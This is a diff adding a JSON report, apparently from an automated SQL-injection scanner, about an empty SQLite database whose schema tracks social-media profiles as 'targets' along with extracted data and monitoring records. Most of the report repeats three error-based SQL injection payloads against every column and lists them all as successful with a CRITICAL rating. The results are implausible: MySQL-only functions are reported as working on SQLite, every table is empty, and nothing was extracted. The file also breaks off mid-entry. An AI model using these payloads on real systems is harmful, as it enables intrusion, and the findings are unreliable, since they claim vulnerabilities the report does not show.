@@ -1,0 +1,1653 @@
+{
+  "fingerprinting": {
+    "database_type": "SQLite",
+    "file_path": "integrated_targets_2025.db",
+    "file_size": 32768,
+    "tables": [
+      "targets",
+      "sqlite_sequence",
+      "operations",
+      "extracted_data",
+      "target_relationships",
+      "monitoring"
+    ],
+    "schema_info": {
+      "targets": [
+        [
+          0,
+          "id",
+          "INTEGER",
+          0,
+          null,
+          1
+        ],
+        [
+          1,
+          "username",
+          "TEXT",
+          1,
+          null,
+          0
+        ],
+        [
+          2,
+          "full_name",
+          "TEXT",
+          0,
+          null,
+          0
+        ],
+        [
+          3,
+          "profile_pic_url",
+          "TEXT",
+          0,
+          null,
+          0
+        ],
+        [
+          4,
+          "follower_count",
+          "INTEGER",
+          0,
+          "0",
+          0
+        ],
+        [
+          5,
+          "following_count",
+          "INTEGER",
+          0,
+          "0",
+          0
+        ],
+        [
+          6,
+          "post_count",
+          "INTEGER",
+          0,
+          "0",
+          0
+        ],
+        [
+          7,
+          "is_private",
+          "BOOLEAN",
+          0,
+          "0",
+          0
+        ],
+        [
+          8,
+          "is_verified",
+          "BOOLEAN",
+          0,
+          "0",
+          0
+        ],
+        [
+          9,
+          "biography",
+          "TEXT",
+          0,
+          null,
+          0
+        ],
+        [
+          10,
+          "external_url",
+          "TEXT",
+          0,
+          null,
+          0
+        ],
+        [
+          11,
+          "target_type",
+          "TEXT",
+          0,
+          "'standard'",
+          0
+        ],
+        [
+          12,
+          "priority",
+          "INTEGER",
+          0,
+          "1",
+          0
+        ],
+        [
+          13,
+          "status",
+          "TEXT",
+          0,
+          "'pending'",
+          0
+        ],
+        [
+          14,
+          "created_at",
+          "TIMESTAMP",
+          0,
+          "CURRENT_TIMESTAMP",
+          0
+        ],
+        [
+          15,
+          "updated_at",
+          "TIMESTAMP",
+          0,
+          "CURRENT_TIMESTAMP",
+          0
+        ],
+        [
+          16,
+          "last_accessed",
+          "TIMESTAMP",
+          0,
+          null,
+          0
+        ],
+        [
+          17,
+          "notes",
+          "TEXT",
+          0,
+          null,
+          0
+        ]
+      ],
+      "sqlite_sequence": [
+        [
+          0,
+          "name",
+          "",
+          0,
+          null,
+          0
+        ],
+        [
+          1,
+          "seq",
+          "",
+          0,
+          null,
+          0
+        ]
+      ],
+      "operations": [
+        [
+          0,
+          "id",
+          "INTEGER",
+          0,
+          null,
+          1
+        ],
+        [
+          1,
+          "target_id",
+          "INTEGER",
+          0,
+          null,
+          0
+        ],
+        [
+          2,
+          "operation_type",
+          "TEXT",
+          1,
+          null,
+          0
+        ],
+        [
+          3,
+          "operation_data",
+          "TEXT",
+          0,
+          null,
+          0
+        ],
+        [
+          4,
+          "result_data",
+          "TEXT",
+          0,
+          null,
+          0
+        ],
+        [
+          5,
+          "status",
+          "TEXT",
+          0,
+          "'pending'",
+          0
+        ],
+        [
+          6,
+          "started_at",
+          "TIMESTAMP",
+          0,
+          "CURRENT_TIMESTAMP",
+          0
+        ],
+        [
+          7,
+          "completed_at",
+          "TIMESTAMP",
+          0,
+          null,
+          0
+        ],
+        [
+          8,
+          "error_message",
+          "TEXT",
+          0,
+          null,
+          0
+        ],
+        [
+          9,
+          "proxy_used",
+          "TEXT",
+          0,
+          null,
+          0
+        ],
+        [
+          10,
+          "session_used",
+          "TEXT",
+          0,
+          null,
+          0
+        ],
+        [
+          11,
+          "duration_seconds",
+          "INTEGER",
+          0,
+          null,
+          0
+        ],
+        [
+          12,
+          "data_extracted",
+          "INTEGER",
+          0,
+          "0",
+          0
+        ]
+      ],
+      "extracted_data": [
+        [
+          0,
+          "id",
+          "INTEGER",
+          0,
+          null,
+          1
+        ],
+        [
+          1,
+          "target_id",
+          "INTEGER",
+          0,
+          null,
+          0
+        ],
+        [
+          2,
+          "operation_id",
+          "INTEGER",
+          0,
+          null,
+          0
+        ],
+        [
+          3,
+          "data_type",
+          "TEXT",
+          1,
+          null,
+          0
+        ],
+        [
+          4,
+          "data_content",
+          "TEXT",
+          1,
+          null,
+          0
+        ],
+        [
+          5,
+          "file_path",
+          "TEXT",
+          0,
+          null,
+          0
+        ],
+        [
+          6,
+          "extracted_at",
+          "TIMESTAMP",
+          0,
+          "CURRENT_TIMESTAMP",
+          0
+        ],
+        [
+          7,
+          "data_size",
+          "INTEGER",
+          0,
+          "0",
+          0
+        ],
+        [
+          8,
+          "is_sensitive",
+          "BOOLEAN",
+          0,
+          "0",
+          0
+        ]
+      ],
+      "target_relationships": [
+        [
+          0,
+          "id",
+          "INTEGER",
+          0,
+          null,
+          1
+        ],
+        [
+          1,
+          "source_target_id",
+          "INTEGER",
+          0,
+          null,
+          0
+        ],
+        [
+          2,
+          "related_target_id",
+          "INTEGER",
+          0,
+          null,
+          0
+        ],
+        [
+          3,
+          "relationship_type",
+          "TEXT",
+          0,
+          null,
+          0
+        ],
+        [
+          4,
+          "discovered_at",
+          "TIMESTAMP",
+          0,
+          "CURRENT_TIMESTAMP",
+          0
+        ],
+        [
+          5,
+          "confidence_score",
+          "REAL",
+          0,
+          "0.5",
+          0
+        ]
+      ],
+      "monitoring": [
+        [
+          0,
+          "id",
+          "INTEGER",
+          0,
+          null,
+          1
+        ],
+        [
+          1,
+          "target_id",
+          "INTEGER",
+          0,
+          null,
+          0
+        ],
+        [
+          2,
+          "check_type",
+          "TEXT",
+          1,
+          null,
+          0
+        ],
+        [
+          3,
+          "check_result",
+          "TEXT",
+          0,
+          null,
+          0
+        ],
+        [
+          4,
+          "changes_detected",
+          "TEXT",
+          0,
+          null,
+          0
+        ],
+        [
+          5,
+          "checked_at",
+          "TIMESTAMP",
+          0,
+          "CURRENT_TIMESTAMP",
+          0
+        ]
+      ]
+    },
+    "potential_vulnerabilities": [],
+    "file_permissions": "644",
+    "targets_row_count": 0,
+    "sqlite_sequence_row_count": 0,
+    "operations_row_count": 0,
+    "extracted_data_row_count": 0,
+    "target_relationships_row_count": 0,
+    "monitoring_row_count": 0,
+    "sqlite_version": "3.31.1",
+    "sensitive_patterns": {
+      "passwords": [],
+      "emails": [],
+      "phone_numbers": [],
+      "tokens": [],
+      "personal_data": []
+    }
+  },
+  "sql_injection": {
+    "targets": {
+      "table": "targets",
+      "vulnerable_points": [
+        {
+          "column": "id",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "id",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "id",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "username",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "username",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "username",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "full_name",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "full_name",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "full_name",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "profile_pic_url",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "profile_pic_url",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "profile_pic_url",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "follower_count",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "follower_count",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "follower_count",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "following_count",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "following_count",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "following_count",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "post_count",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "post_count",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "post_count",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "is_private",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "is_private",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "is_private",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "is_verified",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "is_verified",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "is_verified",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "biography",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "biography",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "biography",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "external_url",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "external_url",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "external_url",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "target_type",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "target_type",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "target_type",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "priority",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "priority",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "priority",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "status",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "status",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "status",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "created_at",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "created_at",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "created_at",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "updated_at",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "updated_at",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "updated_at",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "last_accessed",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "last_accessed",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "last_accessed",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "notes",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "notes",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "notes",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        }
+      ],
+      "successful_payloads": [
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+      ],
+      "extracted_data": {},
+      "risk_level": "CRITICAL"
+    },
+    "sqlite_sequence": {
+      "table": "sqlite_sequence",
+      "vulnerable_points": [
+        {
+          "column": "name",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "name",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "name",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "seq",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "seq",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "seq",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        }
+      ],
+      "successful_payloads": [
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--",
+        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
+        "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+      ],
+      "extracted_data": {},
+      "risk_level": "CRITICAL"
+    },
+    "operations": {
+      "table": "operations",
+      "vulnerable_points": [
+        {
+          "column": "id",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "id",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "id",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "target_id",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "target_id",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "target_id",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "operation_type",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "operation_type",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "operation_type",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "operation_data",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "operation_data",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "operation_data",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "result_data",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "result_data",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "result_data",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "status",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "status",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "status",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "started_at",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "started_at",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "started_at",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "completed_at",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "completed_at",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "completed_at",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "error_message",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "error_message",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "error_message",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "proxy_used",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "proxy_used",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "proxy_used",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "session_used",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "session_used",
+          "payload_type": "error_based",
+          "payload": "' AND extractvalue(1,CONCAT(0x7e,(SELECT version()),0x7e))--"
+        },
+        {
+          "column": "session_used",
+          "payload_type": "error_based",
+          "payload": "' OR (SELECT * FROM (SELECT COUNT(*) FROM sqlite_master)>-1)--"
+        },
+        {
+          "column": "duration_seconds",
+          "payload_type": "error_based",
+          "payload": "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+        },
+        {
+          "column": "duration_seconds",
+          "payload_type": "error_based",
